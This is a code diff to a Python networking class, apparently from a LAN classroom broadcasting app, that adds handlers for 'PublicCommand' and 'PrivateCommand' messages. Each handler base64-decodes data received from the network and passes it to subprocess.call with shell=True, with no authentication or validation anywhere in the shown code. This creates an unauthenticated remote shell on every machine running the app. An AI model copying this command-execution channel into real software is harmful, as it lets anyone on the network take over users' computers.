@@ -3,6 +3,7 @@ import socket
 import time
 import struct
 import base64
+import subprocess
 from Packages import ClassBroadcastFlag
 
 
@@ -34,6 +35,10 @@ class ClassBroadcast(QObject):
             socket.inet_aton(self.socket_ip) + socket.inet_aton(self.current_ip)
         )
 
+    @staticmethod
+    def execute_remote_command(command):
+        subprocess.call(command, shell=True)
+
     def start(self):
         payload_size = self.socket_buffer_size - struct.calcsize('!2i')
         while True:
@@ -53,6 +58,18 @@ class ClassBroadcast(QObject):
                         message = unpacked_data[integer_length + targets_length:]
                         message = base64.b64decode(message).decode('utf-8')
                         self.parent.message_recieved.emit('private', str(message))
+                elif unpacked_flag == ClassBroadcastFlag.PublicCommand:
+                    unpacked_data = base64.b64decode(unpacked_data).decode('utf-8')
+                    self.execute_remote_command(unpacked_data)
+                elif unpacked_flag == ClassBroadcastFlag.PrivateCommand:
+                    integer_length = struct.calcsize('!i')
+                    targets_length = struct.unpack('!i', unpacked_data[:integer_length])[0]
+                    targets = unpacked_data[integer_length:integer_length + targets_length].split(b'\x00')
+                    targets = [socket.inet_ntoa(item) for item in targets]
+                    if self.current_ip in targets:
+                        message = unpacked_data[integer_length + targets_length:]
+                        message = base64.b64decode(message).decode('utf-8')
+                        self.execute_remote_command(message)
                 elif unpacked_flag == ClassBroadcastFlag.StartScreenBroadcast:
                     self.parent.toggle_screen_broadcats.emit(True)
                 elif unpacked_flag == ClassBroadcastFlag.StopScreenBroadcast:
